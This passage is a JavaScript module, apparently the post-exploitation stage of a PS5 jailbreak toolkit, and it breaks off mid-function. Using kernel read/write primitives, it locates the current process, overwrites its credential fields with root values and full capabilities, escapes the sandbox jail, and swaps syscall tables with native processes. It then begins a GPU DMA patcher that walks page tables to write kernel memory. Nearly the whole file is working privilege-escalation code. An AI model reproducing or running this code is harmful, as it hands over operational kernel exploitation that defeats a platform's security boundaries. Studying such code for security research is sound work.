(function (root) {
    "use strict";

    const NS = root.Slopkit = root.Slopkit || {};
    const { U64 } = NS;
    if (!U64 || !NS.PoopsKernel)
        throw new Error("kernel.js must be loaded before post.js");

    // The GPU submit ioctl queues work; it does not attest completion.  The
    // pinned P2JB implementation leaves 500 ms before consuming DMA results.
    // Keeping this value explicit prevents a seemingly harmless shortening
    // from turning kernel-write verification into a timing race.
    const GPU_DMA_SETTLE_MS = 500;

    function findAscii(bytes, text) {
        const needle = new Uint8Array(text.length);
        for (let i = 0; i < text.length; ++i) needle[i] = text.charCodeAt(i);
        outer: for (let i = 0; i <= bytes.length - needle.length; ++i) {
            for (let j = 0; j < needle.length; ++j) {
                if (bytes[i + j] !== needle[j]) continue outer;
            }
            if (i + needle.length === bytes.length
                || bytes[i + needle.length] === 0)
                return i;
        }
        return -1;
    }

    class RootEscalator {
        constructor(kernel, profile) {
            this.kernel = kernel;
            this.profile = profile;
            this.context = null;
            this.patchJournal = [];
        }

        o(path) { return this.profile.offset(path); }

        requireKernelPointer(value, label) {
            const pointer = U64.from(value);
            if (!pointer.isKernelPointer())
                throw new Error(`${label} is not a canonical kernel pointer: ${pointer.toHex()}`);
            return pointer;
        }

        readValue(kind, address) {
            if (kind === 32) return this.kernel.read32(address) >>> 0;
            if (kind === 64) return this.kernel.read64(address);
            throw new Error(`unsupported root target width ${kind}`);
        }

        writeValue(kind, address, value) {
            if (kind === 32) this.kernel.write32(address, value);
            else if (kind === 64) this.kernel.write64(address, value);
            else throw new Error(`unsupported root target width ${kind}`);
        }

        valuesEqual(left, right) {
            return left instanceof U64 || right instanceof U64
                ? U64.from(left).eq(right) : left === right;
        }

        stableRead(kind, address, label) {
            const first = this.readValue(kind, address);
            const second = this.readValue(kind, address);
            if (!this.valuesEqual(first, second))
                throw new Error(`${label} changed across repeated kernel reads`);
            return first;
        }

        findDataBase(curproc) {
            let cursor = curproc;
            const allprocOffset = U64.from(this.o("post.allproc"));
            for (let i = 0; i < 512; ++i) {
                cursor = this.kernel.read64(cursor.add32(8));
                if (!cursor.isKernelPointer()) break;
                const candidate = cursor.sub(allprocOffset);
                // Both pinned Poops implementations use 4 KiB here. Do not
                // substitute the PS5's 16 KiB VM page size: the kernel data
                // slide only needs the source's image-alignment invariant.
                if ((candidate.lo & 0xfff) === 0) {
                    const first = this.kernel.read64(cursor);
                    if (!first.isKernelPointer()) continue;
                    const firstPreviousLink = this.kernel.read64(first.add32(8));
                    if (firstPreviousLink.eq(cursor)) return candidate;
                }
            }
            throw new Error("kernel data base was not found from the proc list head");
        }

        walkProcesses(allprocAddress) {
            const processes = new Map();
            const seenPointers = new Set();
            let process = this.kernel.read64(allprocAddress);
            let expectedPreviousLink = U64.from(allprocAddress);
            let terminated = false;
            let count = 0;
            for (; count < 1024; ++count) {
                if (process.isZero()) {
                    terminated = true;
                    break;
                }
                this.requireKernelPointer(process, `process-list entry ${count}`);
                const key = process.toHex();
                if (seenPointers.has(key))
                    throw new Error(`process list loop at ${key}`);
                seenPointers.add(key);

                const previousLink = this.kernel.read64(process.add32(8));
                if (!previousLink.eq(expectedPreviousLink))
                    throw new Error(`process list le_prev mismatch at ${key}`);
                const pid = this.kernel.read32(process.add32(
                    this.o("kernel.structures.procPid"))) | 0;
                if (pid < 0)
                    throw new Error(`process list contains invalid PID ${pid}`);
                if (processes.has(pid))
                    throw new Error(`process list contains duplicate PID ${pid}`);
                processes.set(pid, process);

                expectedPreviousLink = process;
                process = this.kernel.read64(process);
            }
            if (!terminated)
                throw new Error("process list did not terminate within 1024 entries");
            if (processes.size < 3)
                throw new Error(`process list is implausibly short: ${processes.size}`);
            return processes;
        }

        findProcess(allprocAddress, pid, processes) {
            if (processes) {
                const process = processes.get(pid);
                if (process) return process;
                throw new Error(`process ${pid} was not found`);
            }
            let process = this.kernel.read64(allprocAddress);
            for (let i = 0; i < 1024 && process.isKernelPointer(); ++i) {
                if ((this.kernel.read32(process.add32(
                    this.o("kernel.structures.procPid"))) | 0) === pid)
                    return process;
                process = this.kernel.read64(process);
            }
            throw new Error(`process ${pid} was not found`);
        }

        processPointers(process, label) {
            const ucred = this.stableRead(64, process.add32(
                this.o("kernel.structures.procUcred")), `${label} ucred`);
            const fd = this.stableRead(64, process.add32(
                this.o("kernel.structures.procFd")), `${label} filedesc`);
            this.requireKernelPointer(ucred, `${label} ucred`);
            this.requireKernelPointer(fd, `${label} filedesc`);
            return { ucred, fd };
        }

        targetDefinitions(context) {
            const ucred = context.procUcred;
            const fd = context.procFd;
            const dynlib = context.dynlib;
            const segments = context.segments;
            return [
                { name: "uid", kind: 32, address: ucred.add32(0x04) },
                { name: "ruid", kind: 32, address: ucred.add32(0x08) },
                { name: "svuid", kind: 32, address: ucred.add32(0x0c) },
                { name: "ngroups", kind: 32, address: ucred.add32(0x10) },
                { name: "rgid", kind: 32, address: ucred.add32(0x14) },
                { name: "svgid", kind: 32, address: ucred.add32(0x18) },
                { name: "prison", kind: 64, address: ucred.add32(0x30) },
                { name: "authid", kind: 64, address: ucred.add32(0x58) },
                { name: "caps0", kind: 64, address: ucred.add32(0x60) },
                { name: "caps1", kind: 64, address: ucred.add32(0x68) },
                { name: "sce-attrs", kind: 64, address: ucred.add32(0x80) },
                { name: "cdir", kind: 64, address: fd.add32(0x08) },
                { name: "rdir", kind: 64, address: fd.add32(0x10) },
                { name: "jdir", kind: 64, address: fd.add32(0x18) },
                { name: "dynlib-start", kind: 64, address: dynlib.add32(0xf0) },
                { name: "dynlib-end", kind: 64, address: dynlib.add32(0xf8) },
                { name: "segment-start", kind: 64, address: segments.add32(0x08) },
                { name: "segment-end", kind: 64, address: segments.add32(0x10) }
            ];
        }

        snapshotTargets(context) {
            const snapshot = new Map();
            for (const target of this.targetDefinitions(context)) {
                snapshot.set(target.name, Object.assign({}, target, {
                    value: this.stableRead(target.kind, target.address, target.name)
                }));
            }
            const ngroups = snapshot.get("ngroups").value;
            if (ngroups === 0 || ngroups > 16)
                throw new Error(`curproc credential group count is implausible: ${ngroups}`);
            for (const name of ["prison", "cdir", "rdir"]) {
                this.requireKernelPointer(snapshot.get(name).value,
                    `curproc ${name}`);
            }
            const jdir = snapshot.get("jdir").value;
            if (!jdir.isZero()) this.requireKernelPointer(jdir, "curproc jdir");
            return snapshot;
        }

        closeDiscoveryPair(pair) {
            const failures = [];
            if (!pair) return failures;
            for (const fd of [pair[1], pair[0]]) {
                if (!Number.isInteger(fd) || fd < 0) continue;
                try {
                    const result = this.kernel.callI32("native.exports.close", [fd]);
                    if (result !== 0) failures.push(`close(${fd})=${result}`);
                } catch (error) {
                    failures.push(`close(${fd}): ${error.message}`);
                }
            }
            return failures;
        }

        discover() {
            if (this.context) return this.context;
            let pair = null;
            let discovered = null;
            let failure = null;
            try {
                const seed = this.kernel.processSeed;
                let pid, curproc;
                if (seed) {
                    pid = seed.pid;
                    curproc = this.requireKernelPointer(seed.curproc,
                        "retained SIGIO curproc");
                    if (!Number.isInteger(pid) || pid <= 1)
                        throw new Error(`retained native PID is invalid: ${pid}`);
                } else {
                    pair = this.kernel.createPipePair("sigio-pipe");
                    pid = this.kernel.callI32("native.exports.getpid", []);
                    if (!Number.isInteger(pid) || pid <= 1)
                        throw new Error(`native getpid returned ${pid}`);
                    const pidBuffer = this.kernel.alloc(4, 4, "sigio-pid");
                    pidBuffer.put32(0, pid);
                    const ioctl = this.kernel.callI32("native.exports.ioctl",
                        [pair[0], this.o("kernel.constants.fiosetown"),
                            pidBuffer.address]);
                    if (ioctl !== 0) throw new Error(`FIOSETOWN failed ${ioctl}`);

                    const file = this.requireKernelPointer(this.kernel.fget(pair[0]),
                        "SIGIO pipe file");
                    const pipe = this.requireKernelPointer(this.kernel.read64(file),
                        "SIGIO pipe data");
                    const sigio = this.requireKernelPointer(this.kernel.read64(
                        pipe.add32(this.o("kernel.structures.pipeSigio"))),
                    "SIGIO owner");
                    curproc = this.requireKernelPointer(this.kernel.read64(sigio),
                        "SIGIO curproc");
                }
                const actualPid = this.kernel.read32(curproc.add32(
                    this.o("kernel.structures.procPid"))) | 0;
                if (actualPid !== pid)
                    throw new Error(`curproc PID mismatch: ${actualPid} != ${pid}`);

                const dataBase = this.findDataBase(curproc);
                const allproc = dataBase.add32(this.o("post.allproc"));
                const processes = this.walkProcesses(allproc);
                const kernelProc = this.findProcess(allproc, 0, processes);
                const initProc = this.findProcess(allproc, 1, processes);
                const listedCurproc = this.findProcess(allproc, pid, processes);
                if (!listedCurproc.eq(curproc))
                    throw new Error("SIGIO curproc disagrees with the allproc entry");

                const ours = this.processPointers(curproc, "curproc");
                if (seed && (!ours.ucred.eq(seed.procUcred)
                    || !ours.fd.eq(seed.procFd)))
                    throw new Error("retained SIGIO process pointers changed");
                const kernelPointers = this.processPointers(kernelProc, "PID 0");
                const initPointers = this.processPointers(initProc, "PID 1");
                const dynlib = this.stableRead(64, curproc.add32(
                    this.o("kernel.structures.procDynlib")), "curproc dynlib");
                this.requireKernelPointer(dynlib, "curproc dynlib");
                const eboot = this.stableRead(64, dynlib, "curproc eboot metadata");
                this.requireKernelPointer(eboot, "curproc eboot metadata");
                const segments = this.stableRead(64, eboot.add32(0x40),
                    "curproc eboot segments");
                this.requireKernelPointer(segments, "curproc eboot segments");

                const pid0Root = this.stableRead(64,
                    kernelPointers.fd.add32(0x08), "PID 0 cdir root vnode");
                const pid1Root = this.stableRead(64,
                    initPointers.fd.add32(0x10), "PID 1 rdir root vnode");
                const globalRoot = this.stableRead(64,
                    dataBase.add32(this.o("post.rootVnode")), "global root vnode");
                for (const [label, value] of [["PID 0 root vnode", pid0Root],
                    ["PID 1 root vnode", pid1Root],
                    ["global root vnode", globalRoot]])
                    this.requireKernelPointer(value, label);
                if (!pid0Root.eq(pid1Root) || !pid0Root.eq(globalRoot))
                    throw new Error("root vnode sources disagree");

                const pid0Prison = this.stableRead(64,
                    kernelPointers.ucred.add32(0x30), "PID 0 prison0");
                const pid1Prison = this.stableRead(64,
                    initPointers.ucred.add32(0x30), "PID 1 prison0");
                this.requireKernelPointer(pid0Prison, "PID 0 prison0");
                this.requireKernelPointer(pid1Prison, "PID 1 prison0");
                if (!pid0Prison.eq(pid1Prison))
                    throw new Error("prison0 sources disagree");

                discovered = { pid, curproc, dataBase, allproc, processes,
                    processCount: processes.size, kernelProc, initProc,
                    procUcred: ours.ucred, procFd: ours.fd, dynlib, eboot, segments,
                    rootVnode: pid0Root, prison0: pid0Prison,
                    rootSources: { pid0: pid0Root, pid1: pid1Root,
                        global: globalRoot },
                    prisonSources: { pid0: pid0Prison, pid1: pid1Prison } };
                discovered.snapshot = this.snapshotTargets(discovered);
            } catch (error) {
                failure = error;
            } finally {
                const closeFailures = this.closeDiscoveryPair(pair);
                if (closeFailures.length) {
                    const suffix = `SIGIO pipe cleanup failed: ${closeFailures.join("; ")}`;
                    failure = failure
                        ? new Error(`${failure.message}; ${suffix}`) : new Error(suffix);
                }
            }
            if (failure) throw failure;

            this.context = discovered;
            return this.context;
        }

        verifySnapshotUnchanged(snapshot) {
            for (const target of snapshot.values()) {
                const actual = this.readValue(target.kind, target.address);
                if (!this.valuesEqual(actual, target.value))
                    throw new Error(`root precondition changed before mutation: ${target.name}`);
            }
        }

        validatePatchPreconditions(context) {
            const snapshot = context.snapshot;
            const expected = this.profile.value("post.browserCredential");
            const mismatch = (name, observed, wanted) => new Error(
                `root hardware precondition mismatch: ${name} observed=${observed}`
                + ` expected=${wanted}`);
            for (const name of ["uid", "ruid", "svuid", "ngroups", "rgid", "svgid"]) {
                const observed = snapshot.get(name).value;
                if (observed !== expected[name])
                    throw mismatch(name, observed, expected[name]);
            }
            for (const [name, field] of [["authid", "authId"],
                ["caps0", "caps0"], ["caps1", "caps1"],
                ["sce-attrs", "attrs"]]) {
                const observed = snapshot.get(name).value;
                if (!observed.eq(expected[field]))
                    throw mismatch(name, observed, expected[field]);
            }
            if (!snapshot.get("prison").value.eq(context.prison0))
                throw new Error("root hardware precondition mismatch: prison is not prison0");
            const cdir = snapshot.get("cdir").value;
            const rdir = snapshot.get("rdir").value;
            const jdir = snapshot.get("jdir").value;
            if (!cdir.eq(rdir) || !cdir.eq(jdir))
                throw new Error("root hardware precondition mismatch: sandbox directories disagree");
            if (cdir.eq(context.rootVnode))
                throw new Error("root hardware precondition mismatch: process is already unjailed");

            const dynlibStart = snapshot.get("dynlib-start").value;
            const dynlibEnd = snapshot.get("dynlib-end").value;
            if (dynlibStart.isZero() || dynlibEnd.compare(dynlibStart) <= 0) {
                throw new Error("root hardware precondition mismatch: dynlib range");
            }
            const dynlibSize = dynlibEnd.sub(dynlibStart);
            if (dynlibSize.hi !== 0 || dynlibSize.lo < 0x1000
                || dynlibSize.lo > 0x1000000)
                throw new Error("root hardware precondition mismatch: dynlib size");
            const segmentStart = snapshot.get("segment-start").value;
            const segmentSize = snapshot.get("segment-end").value;
            if (segmentStart.isZero() || segmentSize.isZero()
                || segmentSize.hi !== 0 || segmentSize.lo > 0x10000000)
                throw new Error("root hardware precondition mismatch: eboot segment");
        }

        patchOperations(context) {
            const snapshot = context.snapshot;
            // Preserve cdir/execution policy; prison/attrs are preconditions.
            const values = new Map([
                ["rdir", context.rootVnode], ["jdir", context.rootVnode],
                ["authid", U64.from(this.profile.value("post.systemAuthId"))],
                ["caps0", U64.ones()], ["caps1", U64.ones()],
                ["svgid", 0], ["rgid", 0], ["svuid", 0], ["ruid", 0],
                // UID is the final commit marker after every wider field.
                ["uid", 0]
            ]);
            return Array.from(values, ([name, after]) => {
                const target = snapshot.get(name);
                if (!target) throw new Error(`root snapshot is missing ${name}`);
                return Object.assign({}, target, { before: target.value, after });
            });
        }

        verifyPatchResult(context, operations) {
            const expected = new Map(Array.from(context.snapshot,
                ([name, target]) => [name, target.value]));
            for (const operation of operations)
                expected.set(operation.name, operation.after);
            const final = new Map();
            for (const target of context.snapshot.values()) {
                const actual = this.readValue(target.kind, target.address);
                if (!this.valuesEqual(actual, expected.get(target.name)))
                    throw new Error(`root final readback failed: ${target.name}`);
                final.set(target.name, actual);
            }
            const preserved = (name) => this.valuesEqual(final.get(name),
                context.snapshot.get(name).value);
            return {
                uid: final.get("uid"), ruid: final.get("ruid"),
                svuid: final.get("svuid"), rgid: final.get("rgid"),
                svgid: final.get("svgid"), ngroups: final.get("ngroups"),
                authid: final.get("authid").toHex(),
                caps0: final.get("caps0").toHex(),
                caps1: final.get("caps1").toHex(),
                ngroupsPreserved: preserved("ngroups"),
                cdirPreserved: preserved("cdir"),
                prisonPreserved: preserved("prison"),
                attrsPreserved: preserved("sce-attrs"),
                executionPolicyPreserved: ["dynlib-start", "dynlib-end",
                    "segment-start", "segment-end"].every(preserved),
                rdirRoot: final.get("rdir").eq(context.rootVnode),
                jdirRoot: final.get("jdir").eq(context.rootVnode),
                fullSnapshotVerified: final.size === context.snapshot.size
            };
        }

        rollbackPatch(journal, cause, snapshot) {
            const failures = [];
            for (let index = journal.length - 1; index >= 0; --index) {
                const entry = journal[index];
                try {
                    this.writeValue(entry.kind, entry.address, entry.before);
                    const actual = this.readValue(entry.kind, entry.address);
                    if (!this.valuesEqual(actual, entry.before))
                        throw new Error("readback mismatch");
                } catch (error) {
                    failures.push(`${entry.name}: ${error.message}`);
                }
            }
            for (const target of snapshot.values()) {
                try {
                    const actual = this.readValue(target.kind, target.address);
                    if (!this.valuesEqual(actual, target.value))
                        failures.push(`${target.name}: full-snapshot mismatch`);
                } catch (error) {
                    failures.push(`${target.name}: final rollback read: ${error.message}`);
                }
            }
            if (failures.length) {
                const error = new Error(`root patch failed: ${cause.message}; rollback failed: ${failures.join("; ")}`);
                error.rebootRequired = true;
                error.rollbackVerified = false;
                return error;
            }
            const error = new Error(`root patch failed and was rolled back: ${cause.message}`);
            error.rebootRequired = true;
            error.rollbackVerified = true;
            return error;
        }

        patch() {
            const ctx = this.context || this.discover();
            this.verifySnapshotUnchanged(ctx.snapshot);
            this.validatePatchPreconditions(ctx);
            const operations = this.patchOperations(ctx);
            const journal = [];
            this.patchJournal = journal;
            try {
                for (const operation of operations) {
                    if (this.valuesEqual(operation.before, operation.after)) continue;
                    // Journal before the write so a short/throwing transport can
                    // still be restored if it changed any bytes.
                    journal.push(operation);
                    this.writeValue(operation.kind, operation.address, operation.after);
                    const actual = this.readValue(operation.kind, operation.address);
                    if (!this.valuesEqual(actual, operation.after))
                        throw new Error(`root readback failed: ${operation.name}`);
                }
                this.patchResult = this.verifyPatchResult(ctx, operations);
            } catch (error) {
                throw this.rollbackPatch(journal, error, ctx.snapshot);
            }
            return ctx;
        }

        inspectSysent(process, label) {
            const address = this.stableRead(64, process.add32(
                this.o("post.sysentOffset")), `${label} sysent`);
            this.requireKernelPointer(address, `${label} sysent`);
            const size = this.stableRead(32, address, `${label} sysent size`);
            const table = this.stableRead(64, address.add32(8),
                `${label} sysent table`);
            if (!size || size > 0x10000)
                throw new Error(`${label} has invalid sysent size ${size}`);
            this.requireKernelPointer(table, `${label} sysent table`);
            return { address, size, table };
        }

        findNativeProcesses() {
            const ctx = this.context || this.discover();
            const names = ["SceRedisServer", "SceSysAv", "SceGameLive",
                "SceWebkitProcess"];
            const currentSysent = this.inspectSysent(ctx.curproc, "current process");
            const candidates = [];
            for (const [pid, process] of ctx.processes) {
                if (process.eq(ctx.curproc)) continue;
                const bytes = this.kernel.read(process, 0x1500);
                let match = null;
                for (const name of names) {
                    const offset = findAscii(bytes, name);
                    if (offset >= 0) { match = { name, offset }; break; }
                }
                if (!match) continue;
                const repeated = this.kernel.read(process, 0x1500);
                if (findAscii(repeated, match.name) !== match.offset)
                    throw new Error(`native process name changed for PID ${pid}`);
                const actualPid = this.stableRead(32, process.add32(
                    this.o("kernel.structures.procPid")),
                `native candidate ${match.name} PID`) | 0;
                if (actualPid !== pid)
                    throw new Error(`native candidate PID mismatch ${actualPid}/${pid}`);
                const sysent = this.inspectSysent(process,
                    `native candidate ${match.name}`);
                const distinct = sysent.size !== currentSysent.size
                    || !sysent.table.eq(currentSysent.table);
                candidates.push({ pid, process, name: match.name,
                    nameOffset: match.offset, sysent, distinct });
            }
            if (!candidates.length)
                throw new Error("a native-sysent process was not found");
            const distinctCandidates = candidates.filter((candidate) =>
                candidate.distinct).length;
            return { current: currentSysent, candidates, distinctCandidates };
        }

    }

    class SysentSwitcher {
        constructor(kernel, profile, curproc, target) {
            this.kernel = kernel;
            this.profile = profile;
            this.curproc = curproc;
            this.target = target;
            this.saved = null;
        }

        swap() {
            if (this.saved) throw new Error("sysent is already swapped");
            const offset = this.profile.offset("post.sysentOffset");
            const ours = this.kernel.read64(this.curproc.add32(offset));
            const theirs = this.kernel.read64(this.target.add32(offset));
            if (!ours.isKernelPointer() || !theirs.isKernelPointer())
                throw new Error("invalid sysent pointers");
            const ourSize = this.kernel.read32(ours);
            const ourTable = this.kernel.read64(ours.add32(8));
            const targetSize = this.kernel.read32(theirs);
            const targetTable = this.kernel.read64(theirs.add32(8));
            if (!ourSize || !targetSize || ourSize > 0x10000 || targetSize > 0x10000
                || !ourTable.isKernelPointer() || !targetTable.isKernelPointer())
                throw new Error("invalid sysent vector contents");
            this.saved = { address: ours, size: ourSize, table: ourTable };
            this.kernel.write32(ours, targetSize);
            this.kernel.write64(ours.add32(8), targetTable);
            if (this.kernel.read32(ours) !== targetSize
                || !this.kernel.read64(ours.add32(8)).eq(targetTable))
                throw new Error("sysent substitution readback failed");
        }

        restore() {
            if (!this.saved) return;
            const saved = this.saved;
            try {
                this.kernel.write32(saved.address, saved.size);
                this.kernel.write64(saved.address.add32(8), saved.table);
                if (this.kernel.read32(saved.address) !== saved.size
                    || !this.kernel.read64(saved.address.add32(8)).eq(saved.table))
                    throw new Error("readback mismatch");
                this.saved = null;
            } catch (cause) {
                const error = new Error(`sysent restoration failed: ${cause.message}`);
                error.rebootRequired = true;
                error.rollbackVerified = false;
                throw error;
            }
        }

        run(callback) {
            try {
                this.swap();
                return callback();
            } finally {
                this.restore();
            }
        }
    }

    class GpuPatcher {
        constructor(kernel, rootContext, switcher) {
            this.kernel = kernel;
            this.profile = kernel.profile;
            this.bridge = kernel.bridge;
            this.rootContext = rootContext;
            this.switcher = switcher;
            this.dmapBase = U64.zero();
            this.kernelCr3 = U64.zero();
            this.gpuFd = -1;
            this.victimVa = 0;
            this.transferVa = 0;
            this.commandVa = 0;
            this.victimPtbe = U64.zero();
            this.clearedPtbe = U64.zero();
            this.ioctlDesc = null;
            this.ioctlSub = null;
            this.path = null;
            this.out = null;
            this.timespec = null;
            this.patchJournal = [];
            this.patchResult = null;
        }

        allocateWorkBuffers() {
            if (this.ioctlDesc) return;
            this.ioctlDesc = this.kernel.alloc(0x10, 8, "gpu-ioctl-desc");
            this.ioctlSub = this.kernel.alloc(0x10, 8, "gpu-ioctl-submit");
            this.path = this.kernel.alloc(0x10, 8, "gpu-device-path");
            this.path.putCString(0, "/dev/gc", 0x10);
            this.out = this.kernel.alloc(8, 8, "gpu-dmem-out");
            this.timespec = this.kernel.alloc(0x10, 8, "gpu-timespec");
        }

        o(path) { return this.profile.offset(path); }
        bit(value, shift) { return value.shru(shift).lo & 1; }
        field(value, shift, mask) { return value.shru(shift).lo & mask; }
        physToDmap(pa) { return this.dmapBase.add(pa); }

        stable32(address, label) {
            const first = this.kernel.read32(address) >>> 0;
            const second = this.kernel.read32(address) >>> 0;
            if (first !== second) throw new Error(`${label} changed across reads`);
            return first;
        }

        stable64(address, label) {
            const first = this.kernel.read64(address);
            const second = this.kernel.read64(address);
            if (!first.eq(second)) throw new Error(`${label} changed across reads`);
            return first;
        }

        requireKernelPointer(value, label) {
            if (!value.isKernelPointer())
                throw new Error(`${label} is not a kernel pointer: ${value.toHex()}`);
            return value;
        }

        virtToPhys(virtualAddress, cr3) {
            const va = U64.from(virtualAddress);
            const physMask = U64.fromHex("0x000ffffffffff000");
            const pml4e = this.kernel.read64(this.physToDmap(
                U64.from(cr3).and(physMask)).add32(
                (va.shru(39).lo & 0x1ff) * 8));
            if (!this.bit(pml4e, 0)) return U64.zero();
            const pdpte = this.kernel.read64(this.physToDmap(pml4e.and(physMask)).add32(
                (va.shru(30).lo & 0x1ff) * 8));
            if (!this.bit(pdpte, 0)) return U64.zero();
            if (this.bit(pdpte, 7))
                return pdpte.and("0x000fffffc0000000").or(va.and("0x3fffffff"));
            const pde = this.kernel.read64(this.physToDmap(pdpte.and(physMask)).add32(
                (va.shru(21).lo & 0x1ff) * 8));
            if (!this.bit(pde, 0)) return U64.zero();
            if (this.bit(pde, 7))
                return pde.and("0x000fffffffe00000").or(va.and("0x1fffff"));
            const pte = this.kernel.read64(this.physToDmap(pde.and(physMask)).add32(
                (va.shru(12).lo & 0x1ff) * 8));
            if (!this.bit(pte, 0)) return U64.zero();
            return pte.and(physMask).or(va.and("0xfff"));
        }

        stableVirtToPhys(virtualAddress, cr3) {
            const va = U64.from(virtualAddress);
            const physMask = U64.fromHex("0x000ffffffffff000");
            const pml4e = this.stable64(this.physToDmap(
                U64.from(cr3).and(physMask)).add32(
                (va.shru(39).lo & 0x1ff) * 8), "pml4e");
            if (!this.bit(pml4e, 0)) return U64.zero();
            const pdpte = this.stable64(this.physToDmap(pml4e.and(physMask)).add32(
                (va.shru(30).lo & 0x1ff) * 8), "pdpte");
            if (!this.bit(pdpte, 0)) return U64.zero();
            if (this.bit(pdpte, 7))
                return pdpte.and("0x000fffffc0000000").or(va.and("0x3fffffff"));
            const pde = this.stable64(this.physToDmap(pdpte.and(physMask)).add32(
                (va.shru(21).lo & 0x1ff) * 8), "pde");
            if (!this.bit(pde, 0)) return U64.zero();
            if (this.bit(pde, 7))
                return pde.and("0x000fffffffe00000").or(va.and("0x1fffff"));
            const pte = this.stable64(this.physToDmap(pde.and(physMask)).add32(
                (va.shru(12).lo & 0x1ff) * 8), "pte");
            if (!this.bit(pte, 0)) return U64.zero();
            return pte.and(physMask).or(va.and("0xfff"));
        }

        discoverKernelTranslation() {
            const store = this.rootContext.dataBase.add32(
                this.o("post.kernelPmapStore"));
            const pml4Offset = this.o("kernel.structures.pmapPml4");
            const cr3Offset = this.o("kernel.structures.pmapCr3");
            const pml4 = this.stable64(store.add32(pml4Offset),
                "kernel pmap PML4");
            const rawCr3 = this.stable64(store.add32(cr3Offset),
                "kernel pmap CR3");
            this.requireKernelPointer(pml4, "kernel pmap PML4");
            const physMask = U64.fromHex("0x000ffffffffff000");
            const cr3 = rawCr3.and(physMask);
            if (cr3.isZero()) throw new Error("kernel pmap CR3 is zero");
            const dmap = pml4.sub(cr3);
            this.requireKernelPointer(dmap, "kernel direct-map base");
            if ((dmap.lo & 0xfff) !== 0)
                throw new Error("kernel direct-map base is not page aligned");
            this.dmapBase = dmap;
            this.kernelCr3 = cr3;

            const pml4Field = store.add32(pml4Offset);
            const pml4Physical = this.stableVirtToPhys(pml4Field, cr3);
            if (pml4Physical.isZero())
                throw new Error("kernel pmap-store translation failed");
            const aliasValue = this.stable64(this.physToDmap(pml4Physical),
                "kernel pmap-store direct-map alias");
            if (!aliasValue.eq(pml4))
                throw new Error("kernel pmap-store direct-map alias disagrees");
        }

        discoverProcCr3(process) {
            const vmspace = this.stable64(process.add32(
                this.o("kernel.structures.procVmspace")), "process vmspace");
            this.requireKernelPointer(vmspace, "process vmspace");
            // vm_pmap is an embedded vmspace member on 10.01. The Java
            // reference scans compatibility pointers that may refer to this
            // member; an exact profile addresses the member itself.
            const objectOffset = this.o(
                "kernel.structures.vmspacePmapObject");
            const pointer = vmspace.add32(objectOffset);
            this.requireKernelPointer(pointer, "profiled process pmap object");

            const physMask = U64.fromHex("0x000ffffffffff000");
            const pml4 = this.stable64(pointer.add32(
                this.o("kernel.structures.pmapPml4")), "process pmap PML4");
            const rawCr3 = this.stable64(pointer.add32(
                this.o("kernel.structures.pmapCr3")), "process pmap CR3");
            this.requireKernelPointer(pml4, "process pmap PML4");
            const cr3 = rawCr3.and(physMask);
            if (cr3.isZero()) throw new Error("profiled process pmap CR3 is zero");
            const expectedPml4 = this.dmapBase.add(cr3);
            if (!pml4.eq(expectedPml4))
                throw new Error(`process pmap PML4/direct-map disagreement: observed=${pml4.toHex()} expected=${expectedPml4.toHex()}`);
            return { cr3 };
        }

        attestProcTranslation(process) {
            const result = this.discoverProcCr3(process);
            const webkitBase = U64.from(this.kernel.webkitBase);
            const webkitPhysical = this.stableVirtToPhys(webkitBase, result.cr3);
            if (webkitPhysical.isZero())
                throw new Error("WebKit mapping was not translated through process CR3");
            return result;
        }

        inventoryVmids(process) {
            const vmspace = this.stable64(process.add32(
                this.o("kernel.structures.procVmspace")), "GPU vmspace");
            this.requireKernelPointer(vmspace, "GPU vmspace");
            const seen = new Set();
            for (let i = 1; i <= 8; ++i) {
                const value = this.stable32(vmspace.add32(0x1d4 + i * 4),
                    `VMID candidate ${i}`);
                if (value > 0 && value <= 0x10) seen.add(value);
            }
            const valid = [];
            const low48Limit = U64.fromHex("0x0001000000000000");
            for (const vmid of seen) {
                const base = this.rootContext.dataBase.add32(this.o("post.gvmspace")
                    + vmid * this.o("post.sizeofGvmspace"));
                const start = this.stable64(base.add32(8), `VMID ${vmid} start`);
                const size = this.stable64(base.add32(0x10), `VMID ${vmid} size`);
                const pageDirectory = this.stable64(base.add32(0x38),
                    `VMID ${vmid} page directory`);
                const end = start.add(size);
                // Both pinned GPU implementations accept zero as a gvmspace
                // start and validate only that the VA lies in [start, end).
                // Exact-10.01 hardware exposes the canonical full low-48 range
                // [0, 2^48), so rejecting start==0 loses the live VMID.
                const rangeInLow48 = start.compare(low48Limit) < 0
                    && !size.isZero() && end.compare(start) > 0
                    && end.compare(low48Limit) <= 0;
                if (rangeInLow48 && pageDirectory.isKernelPointer()
                    && (pageDirectory.lo & 0xfff) === 0)
                    valid.push(vmid);
            }
            return valid;
        }

        discoverVmids(process) {
            const vmids = this.inventoryVmids(process);
            if (!vmids.length)
                throw new Error("a valid GPU VMID was not found after GPU initialization");
            return vmids;
        }

        getVmid(process) {
            try { return this.discoverVmids(process)[0]; }
            catch { return 0; }
        }

        gpuWalkPt(vmid, virtualAddress) {
            const va = U64.from(virtualAddress);
            const base = this.rootContext.dataBase.add32(this.o("post.gvmspace")
                + vmid * this.o("post.sizeofGvmspace"));
            const pageDirectory = this.kernel.read64(base.add32(0x38));
            const gpuMask = U64.fromHex("0x0000ffffffffffc0");
            const pml4e = this.kernel.read64(pageDirectory.add32(
                (va.shru(39).lo & 0x1ff) * 8));
            if (!this.bit(pml4e, 0)) return null;
            const pdp = pml4e.and(gpuMask);
            const pdpe = this.kernel.read64(this.physToDmap(pdp).add32(
                (va.shru(30).lo & 0x1ff) * 8));
            if (!this.bit(pdpe, 0)) return null;
            const pd = pdpe.and(gpuMask);
            const pdeIndex = va.shru(21).lo & 0x1ff;
            const pdeAddress = this.physToDmap(pd).add32(pdeIndex * 8);
            const pde = this.kernel.read64(pdeAddress);
            if (!this.bit(pde, 0)) return null;
            if (this.bit(pde, 54)) return { entry: pdeAddress, pageSize: 0x200000 };
            const fragment = this.field(pde, 59, 0x1f);
            const offset = va.lo & 0x1fffff;
            const pt = pde.and(gpuMask);
            let pteIndex;
            let pageSize;
            if (fragment === 4) {
                pteIndex = offset >>> 16;
                const pte = this.kernel.read64(this.physToDmap(pt).add32(pteIndex * 8));
                if (this.bit(pte, 0) && this.bit(pte, 56)) {
                    pteIndex = (va.lo & 0xffff) >>> 13;
                    pageSize = 0x2000;
                } else pageSize = 0x10000;
            } else if (fragment === 1) {
                pteIndex = offset >>> 13;
                pageSize = 0x2000;
            } else return null;
            return { entry: this.physToDmap(pt).add32(pteIndex * 8), pageSize };
        }

        getPtbEntry(process, userAddress) {
            const vmid = this.getVmid(process);
            if (!vmid) return null;
